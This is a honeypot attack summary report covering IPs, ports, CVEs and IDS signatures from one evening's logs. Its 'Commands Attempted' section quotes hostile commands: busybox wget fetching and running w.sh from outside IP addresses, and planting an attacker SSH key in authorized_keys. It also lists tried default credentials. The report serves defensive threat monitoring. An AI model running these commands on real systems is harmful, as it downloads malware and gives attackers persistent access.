Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-17T19:01:32Z
**Timeframe:** 2025-10-17T18:20:01Z to 2025-10-17T19:00:02Z
**Log Files:**
- `agg_log_20251017T182001Z.json`
- `agg_log_20251017T184001Z.json`
- `agg_log_20251017T190002Z.json`

**Executive Summary**

This report summarizes 13,850 events recorded across three honeypot log files. The majority of attacks were captured by the Honeytrap (5,442), Cowrie (3,312), and Ciscoasa (1,405) honeypots. A significant portion of the attacks originated from the IP address `146.190.69.241`. The most targeted ports were 5060 (SIP), 443 (HTTPS), and 22 (SSH). Attackers attempted to exploit a variety of CVEs, with a notable number of attempts to execute remote code and gain unauthorized access.

**Detailed Analysis**

***Attacks by Honeypot***

- Honeytrap: 5,442
- Cowrie: 3,312
- Ciscoasa: 1,405
- Suricata: 1,014
- Sentrypeer: 980
- H0neytr4p: 794
- ElasticPot: 504
- Tanner: 122
- Dionaea: 76
- Adbhoney: 40
- ConPot: 37
- Mailoney: 20
- Redishoneypot: 12
- Ipphoney: 11
- Miniprint: 53
- Heralding: 16
- Dicompot: 8
- Honeyaml: 4

***Top Attacking IPs***

- 146.190.69.241: 3,423
- 72.146.232.13: 918
- 172.86.95.115: 379
- 196.251.80.29: 368
- 172.86.95.98: 365
- 167.172.153.88: 218
- 103.144.2.208: 187
- 18.169.127.176: 183
- 3.249.157.229: 183
- 51.44.255.13: 183
- 34.255.198.140: 183
- 72.167.52.254: 173
- 14.103.127.23: 172
- 107.170.36.5: 152
- 68.183.149.135: 112
- 167.250.224.25: 107
- 3.131.215.38: 105

***Top Targeted Ports/Protocols***

- 5060: 980
- 443: 776
- 22: 675
- 9200: 504
- 8333: 113
- 80: 122
- 5905: 78
- 5904: 76
- 5901: 68
- 23: 57
- 9100: 53

***Most Common CVEs***

- CVE-2002-0012
- CVE-2002-0013
- CVE-2006-3602
- CVE-2006-4458
- CVE-2006-4542
- CVE-2009-2765
- CVE-2014-6271
- CVE-2015-2051
- CVE-2018-11776
- CVE-2019-11500
- CVE-2019-10891
- CVE-2019-16920
- CVE-2021-3449
- CVE-2021-42013
- CVE-2022-37056
- CVE-2023-31983
- CVE-2023-47565
- CVE-2023-52163
- CVE-2024-10914
- CVE-2024-12856
- CVE-2024-12885
- CVE-2024-3721
- CVE-2024-33112
- CVE-2025-11488

***Commands Attempted by Attackers***

- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.167/w.sh; sh w.sh; ...`
- `cd /data/local/tmp/; busybox wget http://31.97.160.189/w.sh; sh w.sh; ...`

***Signatures Triggered***

- ET DROP Dshield Block Listed Source group 1: 255
- ET SCAN NMAP -sS window 1024: 131
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 75
- ET INFO Reserved Internal IP Traffic: 48
- ET INFO CURL User Agent: 33
- ET CINS Active Threat Intelligence Poor Reputation IP group 51: 27
- ET SCAN Potential SSH Scan: 17
- ET CINS Active Threat Intelligence Poor Reputation IP group 48: 17
- ET CINS Active Threat Intelligence Poor Reputation IP group 46: 15
- ET INFO curl User-Agent Outbound: 12
- ET HUNTING curl User-Agent to Dotted Quad: 12

***Users / Login Attempts***

- 345gs5662d34/345gs5662d34
- default/default2021
- user/user2002
- test/test2006
- root/150790
- nobody/logon
- root/root2024
- nobody/P@ssword
- config/config12345
- support/asdfgh
- GET / HTTP/1.1/Host: ...

***Files Uploaded/Downloaded***

- wget.sh;
- w.sh;
- c.sh;
- rondo.dgx.sh||busybox
- rondo.dgx.sh||curl
- apply.cgi
- gitlab_logo-*.png
- sign_in
- no_avatar-*.png

**Key Observations and Anomalies**

- The IP `146.190.69.241` was responsible for a large number of events, suggesting a targeted or persistent attacker.
- The commands executed indicate attempts to establish persistent access via SSH keys, gather system information, and download and execute malicious scripts.
- The file downloads from `213.209.143.167` and `31.97.160.189` suggest a malware campaign.
- A wide range of CVEs were targeted, indicating that attackers are using a broad set of exploits to compromise systems.

This concludes the Honeypot Attack Summary Report.